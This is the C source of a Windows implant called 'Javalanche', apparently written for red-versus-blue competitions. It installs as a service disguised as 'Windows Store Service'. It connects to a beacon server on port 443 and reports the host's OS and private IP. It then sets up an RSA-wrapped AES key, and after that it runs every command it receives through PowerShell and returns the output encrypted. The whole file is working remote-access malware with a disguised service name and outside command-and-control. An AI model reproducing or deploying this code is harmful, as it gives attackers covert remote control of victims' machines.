/*
Javalanche Windows Executable
Purpose: Contains all functions needed for code to encrypt/decrypt data with AES
Author: James Southcott
*/
#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <process.h>
#include <ws2tcpip.h>
#include <time.h>
#include <windows.h>
#include <bcrypt.h>
#include <openssl/applink.c>
#include <openssl/bn.h>
#include "caesarCipher.h"
#include "keepAlive.h"
#include "resolveServerAddr.h"
#include "rsa.h"
#include "aes.h"

#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib, "bcrypt.lib")

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;

void ServiceMain(DWORD argc, LPTSTR* argv);
void ControlHandler(DWORD request);

SOCKET clientSocket;

/**
 * Generates a Cryptographically secure AES key
 * 
 * @param hexStr[out] - Buffer that will hold the AES key. Should be dynamically allocated length + 1 bytes
 * @param hexStr[] - Length (in hex) of AES key (ex. 128-bit key = 32, 256-bit key = 64) 
 * @return void
 */
void genAESKey(char* hexStr, int length) {
    UCHAR *bytes = (UCHAR*)malloc(length / 2);

    BCryptGenRandom(NULL, bytes, length / 2, BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    for (int i = 0; i < length / 2; i++) {
        sprintf(&hexStr[i * 2], "%02x", bytes[i]);
    }

    hexStr[length] = '\0';

    free(bytes);
}

/**
    Entry point for the code. Calls ServiceMain()
 */
int main(void) {
    // Connect main thread to the service control messanger
    SERVICE_TABLE_ENTRY ServiceTable[] = {
        {(LPWSTR)TEXT("Windows Store Service"), (LPSERVICE_MAIN_FUNCTION)ServiceMain},
        {NULL, NULL}
    };

    if (!StartServiceCtrlDispatcher(ServiceTable)) {
        printf("Failed to Start Service\n");
    }

    return 0;
}


/**
 * Entry Point for the Windows Service
 *
 * Note: If Starting Service returns a generic error, to ensure that linking is not a apart of the issue, within Visual Studio, set C\C++ > Code Generation > Runtime Library to Multi-Threaded
 * 
 * @param argc[in] - null
 * @param argv[in] - null
 * @return void
 */
void ServiceMain(DWORD argc, LPTSTR* argv) {
    hStatus = RegisterServiceCtrlHandler(TEXT("Windows Store Service"), (LPHANDLER_FUNCTION)ControlHandler);
    if (hStatus == (SERVICE_STATUS_HANDLE)0) {
        // Handle error
        return;
    }

    // Initialize service status
    ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode = 0;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwCheckPoint = 0;
    ServiceStatus.dwWaitHint = 0;

    // Report initial status to SCM
    SetServiceStatus(hStatus, &ServiceStatus);

    // Service initialization code here

    // Report running status when initialization is complete
    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hStatus, &ServiceStatus);

    /////////////////////////////////////
    //   START OF NON-SERVICE CODE     //
    /////////////////////////////////////

    // Initialize the Socket, and server address variables
    WSADATA sockData;
    struct sockaddr_in serverAddr;
    memset(&serverAddr, 0, sizeof(serverAddr));

    WSAStartup(MAKEWORD(2, 2), &sockData);

    char* serverMessage = (char*)malloc(sizeof(char) * 1024);
    for (int i = 0; i < 1024; i++) serverMessage[i] = '\0';

    // Create socket
    clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == -1) {
        perror("Error creating socket");
        exit(-1);
    }

    // Set up server address and port
    char serverIPAddress[16];
    int dnsResolveResult = resolveBeaconServerIPAddr(serverIPAddress);
    if (dnsResolveResult != 0) {
        printf("Could not reach a Beacon Server");
        exit(-1);
    }

    wchar_t wideServerIPAddress[20];
    size_t convertedChars = 0;
    mbstowcs_s(&convertedChars, wideServerIPAddress, sizeof(wideServerIPAddress) / sizeof(wchar_t), serverIPAddress, _TRUNCATE);
    serverAddr.sin_family = AF_INET;
    InetPton(AF_INET, wideServerIPAddress, &serverAddr.sin_addr.s_addr);
    serverAddr.sin_port = htons(443);

    // Connect to server
    int result = connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr));
    if (result != 0) {
        int error = WSAGetLastError();
        printf("Error Code: %d\n", error);
        exit(error);
    }

    // The first message sent to the Server is the OS
    const char* osMessage = "Windows\n";
    send(clientSocket, osMessage, strnlen(osMessage, 8), 0);

    // The second message sent to the Server is the host address.
    // The host address is needed, as in a traditional red vs blue competition, most of the 
    // Infrastructure is sitting behind NAT, while the Proxy server is publicly acessible.
    // So instead of specifying clients by their Natted IP Address, we'd rather look at thier
    // Private IP address that is unique for that competition
    char host[256];
    char ipstr[INET_ADDRSTRLEN + 2];
    struct addrinfo hints, * res, * p;
    int status;

    // Get the hostname
    gethostname(host, sizeof(host));

    // Set up the hints structure
    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    // Get address information
    status = getaddrinfo(host, NULL, &hints, &res);

    // Loop through all the results and get the first IPv4 address
    for (p = res; p != NULL; p = p->ai_next) {
        void* addr = NULL;
        if (p->ai_family == AF_INET) {
            struct sockaddr_in* ipv4 = (struct sockaddr_in*)p->ai_addr;
            addr = &(ipv4->sin_addr);

            // Convert the IP to a string
            inet_ntop(p->ai_family, addr, ipstr, sizeof ipstr);
            int len = strnlen(ipstr, 16);
            ipstr[len + 1] = '\0';
            ipstr[len] = '\n';

            // Send the IP address of the client back to the C2
            send(clientSocket, ipstr, strnlen(ipstr, 17), 0);

            // Break after the first IP address is found
            break;
        }
    }

    // Free the linked list
    freeaddrinfo(res);

    // Set up variables needed for AES encryption
    uint8_t* masterKey = (uint8_t*)malloc(sizeof(uint8_t) * 11);
    char* keyAsHexString = (char*)malloc(sizeof(char) * 33);
    genAESKey(keyAsHexString, 32);
    int numRounds = hexStringToByteArray(keyAsHexString, masterKey);

    KeepAliveParams* params = (KeepAliveParams*)malloc(sizeof(KeepAliveParams));
    params->clientSocket = &clientSocket;
    params->masterKey = masterKey;
    params->numRounds = numRounds;

    // variables used for receiving messages
    int numBytesToRead;
    char* locationOfFirstNewLine;
    int lengthOfMessageLength;
    char* messageLengthAsStr;

    // n and e public key, sent by the beacon server
    char* n_str = (char*)malloc(sizeof(char) * 1024);
    for (int i = 0; i < 1024; i++) n_str[i] = '\0';
    char* e_str = (char*)malloc(sizeof(char) * 1024);
    for (int i = 0; i < 1024; i++) e_str[i] = '\0';

    // Get the n public key from the server
    int bytesRead = recv(clientSocket, n_str, 1023, 0);
    n_str[bytesRead] = '\0';

    // the message is formatted like such 16\nmessage
    // where 16 in the length of the encrypted data. 
    // The following code isolates this number, and then moves the start of
    // the serverMessage buffer to after this first \n

    // Determine the length to the first \n
    locationOfFirstNewLine = strchr(n_str, '\n');
    lengthOfMessageLength = locationOfFirstNewLine - n_str;

    // Initialize twice the length needed, to account for signed bytes in UTF-8
    messageLengthAsStr = (char*)malloc((lengthOfMessageLength + 1) * sizeof(char));
    strncpy_s(messageLengthAsStr, lengthOfMessageLength + 1, n_str, lengthOfMessageLength);

    // Get the message length
    messageLengthAsStr[lengthOfMessageLength] = '\0';
    numBytesToRead = atoi(messageLengthAsStr);
    free(messageLengthAsStr);

    // Update the serverMessage string to point after the '\n'
    n_str = locationOfFirstNewLine + 1;

    // Get the n public key from the server
    bytesRead = recv(clientSocket, e_str, 1023, 0);
    e_str[bytesRead] = '\0';

    // the message is formatted like such 16\nmessage
    // where 16 in the length of the encrypted data. 
    // The following code isolates this number, and then moves the start of
    // the serverMessage buffer to after this first \n

    // Determine the length to the first \n
    locationOfFirstNewLine = strchr(e_str, '\n');
    lengthOfMessageLength = locationOfFirstNewLine - e_str;

    // Initialize twice the length needed, to account for signed bytes in UTF-8
    messageLengthAsStr = (char*)malloc((lengthOfMessageLength + 1) * sizeof(char));
    strncpy_s(messageLengthAsStr, lengthOfMessageLength + 1, e_str, lengthOfMessageLength);

    // Get the message length
    messageLengthAsStr[lengthOfMessageLength] = '\0';
    numBytesToRead = atoi(messageLengthAsStr);
    free(messageLengthAsStr);

    // Update the serverMessage string to point after the '\n'
    e_str = locationOfFirstNewLine + 1;

    char* plainTextHex = OPENSSL_strdup(keyAsHexString);

    rsaEncrypt(&plainTextHex, n_str, e_str);

    // Create the string to be sent back to the beacon with the encrypted AES key
    char* encryptedAESKey = (char*)malloc(sizeof(char) * 270);
    for (int i = 0; i < 270; i++) { encryptedAESKey[i] = '\0'; }
    sprintf_s(encryptedAESKey, 270, "%d\n%s\n", 256, plainTextHex);

    send(clientSocket, encryptedAESKey, 261, 0);

    // Start a thread to send a keep alive message every 30 seconds to the Server
    HANDLE keepAliveThread = (HANDLE)_beginthreadex(NULL, 0, (_beginthreadex_proc_type)&sendKeepAlive, params, 0, NULL);
    
    free(keyAsHexString);

    // Main service loop
    while (ServiceStatus.dwCurrentState = SERVICE_RUNNING) {
        // Get message from Server
        int bytesRead = recv(clientSocket, serverMessage, 1023, 0);
        serverMessage[bytesRead] = '\0';

        // the message is formatted like such 16\nmessage
        // where 16 in the length of the encrypted data. 
        // The following code isolates this number, and then moves the start of
        // the serverMessage buffer to after this first \n

        // Determine the length to the first \n
        locationOfFirstNewLine = strchr(serverMessage, '\n');
        lengthOfMessageLength = locationOfFirstNewLine - serverMessage;

        // Initialize twice the length needed, to account for signed bytes in UTF-8
        messageLengthAsStr = (char*)malloc((lengthOfMessageLength + 1) * sizeof(char));
        strncpy_s(messageLengthAsStr, lengthOfMessageLength + 1, serverMessage, lengthOfMessageLength);

        // Get the message length
        messageLengthAsStr[lengthOfMessageLength] = '\0';
        numBytesToRead = atoi(messageLengthAsStr);
        free(messageLengthAsStr);

        // Update the serverMessage string to point after the '\n'
        serverMessage = locationOfFirstNewLine + 1;

        // Decode the server message from utf 8
        decodeUTF8String(serverMessage, bytesRead - lengthOfMessageLength);

        // Decrypt the Message from the server
        aesDecrypt(serverMessage, masterKey, numRounds, numBytesToRead);
        const char* keepAlive = "KEEP_ALIVE";

        // Check to make sure the message isn't a keep alive message
        if (strncmp(serverMessage, keepAlive, 11) != 0) {
            // Create the string to run the command in the format "Powershell.exe -Command /"[cmdlet]/"
            char command[1100] = "Powershell.exe -Command \"";
            strcat_s(command, rsize_t(1100), serverMessage);
            strcat_s(command, rsize_t(1100), "\"");

            // Create variables to run and store command output
            char* commandOutput = (char*)calloc(8192, sizeof(char));
            FILE* pipe;
            char* messageToSendBack = (char*)calloc(16384, sizeof(char));

            // Open the command for reading
            pipe = _popen(command, "r");
            if (pipe == NULL) {
                printf("Error opening pipe.\n");
            }

            // Get all of the output from the command, and put it all into one string
            while (fgets(commandOutput, 8100, pipe) != NULL) {
                strncat_s(messageToSendBack, rsize_t(16384), commandOutput, rsize_t(8190));
            }

            // Get the size of the message before encryption and encoding occurs
            int messageLen = strnlen(messageToSendBack, 16384);
            if (messageLen % 16 == 0) {
                messageLen += 16;
            }
            else {
                messageLen = 16 * ((messageLen / 16) + 1);
            }

            aesEncrypt(messageToSendBack, masterKey, numRounds);

            char* enlargedBufferForUTF = (char*)malloc(sizeof(char) * ((messageLen * 2) + 1));
            memcpy(enlargedBufferForUTF, messageToSendBack, ((messageLen * 2) + 1));

            free(messageToSendBack);
            int totalBufSize = encodeStringToUTF8(enlargedBufferForUTF, messageLen);

            char* initialNum = (char*)malloc(20);
            _itoa(messageLen, initialNum, 10);
            int beginLen = strnlen(initialNum, 20);
            beginLen++;

            char* finalMessage = (char*)malloc(sizeof(char) * (totalBufSize)+10);
            sprintf(finalMessage, "%d\n", messageLen);
            memcpy(finalMessage + beginLen, enlargedBufferForUTF, totalBufSize);
            free(enlargedBufferForUTF);

            send(clientSocket, finalMessage, totalBufSize + beginLen, 0);

            // Close the pipe
            _pclose(pipe);
        }
    }

    // Cleanup and shutdown
    closesocket(clientSocket);
    ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(hStatus, &ServiceStatus);
}


/**
 * Handles requests from the Windows Service Control Manager to stop/shutdown the service
 *
 * @param request[in] - the request made by the Windows Service Control Manager
 * @return void
 */
void ControlHandler(DWORD request) {
    switch (request) {
    case SERVICE_CONTROL_STOP:
        ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        SetServiceStatus(hStatus, &ServiceStatus);

        // Perform cleanup tasks

        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hStatus, &ServiceStatus);
        closesocket(clientSocket);
        return;

    case SERVICE_CONTROL_SHUTDOWN:
        // Handle shutdown tasks
        closesocket(clientSocket);
        break;

    default:
        break;
    }
}